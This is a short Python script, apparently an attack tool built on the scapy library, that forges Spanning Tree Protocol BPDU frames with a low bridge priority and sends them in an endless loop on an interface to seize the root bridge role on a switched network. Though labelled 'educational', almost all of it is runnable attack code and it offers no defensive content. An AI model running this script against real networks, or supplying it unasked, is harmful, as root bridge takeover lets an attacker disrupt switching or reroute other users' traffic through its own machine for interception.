#!/usr/bin/env python3
"""
STP Protocol Attack Simulation
Educational purposes only
"""

from scapy.all import *
import time

class STPAttack:
    def __init__(self, interface):
        self.interface = interface
        
    def launch_root_bridge_attack(self, target_mac):
        """Simulate STP Root Bridge Takeover"""
        try:
            stp_packet = Ether(dst="01:80:c2:00:00:00") / \
                        LLC(dsap=0x42, ssap=0x42, ctrl=3) / \
                        STP(bridgeid=0x1000,
                            rootid=0x1000,
                            rootmac=target_mac)
            
            print(f"[+] Launching STP attack on interface {self.interface}")
            sendp(stp_packet, iface=self.interface, loop=1, verbose=0)
            
        except Exception as e:
            print(f"[-] Error in attack: {e}")

if __name__ == "__main__":
    attack = STPAttack("eth0")
    attack.launch_root_bridge_attack("00:0c:29:xx:xx:xx")
